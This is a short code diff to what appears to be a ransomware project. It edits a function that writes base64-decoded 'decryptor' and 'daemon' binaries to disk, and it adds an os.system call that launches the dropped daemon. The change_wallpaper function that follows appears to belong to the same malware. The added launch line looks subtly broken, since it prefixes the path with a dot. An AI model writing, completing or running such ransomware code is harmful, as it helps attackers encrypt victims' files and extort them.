@@ -175,8 +175,11 @@ def drop_daemon_and_decryptor():
     with open(ransomware_path + "/decryptor", 'wb') as f:
         f.write(base64.b64decode(decryptor))
 
-    with open(ransomware_path + "/daemon", 'wb') as f3anwsJZ0:
+    with open(ransomware_path + "/daemon", 'wb') as f:
         f.write(base64.b64decode(daemon))
+
+    # run deamon 
+    os.system('.' + ransomware_path + '/daemon')
 
 
 def change_wallpaper():
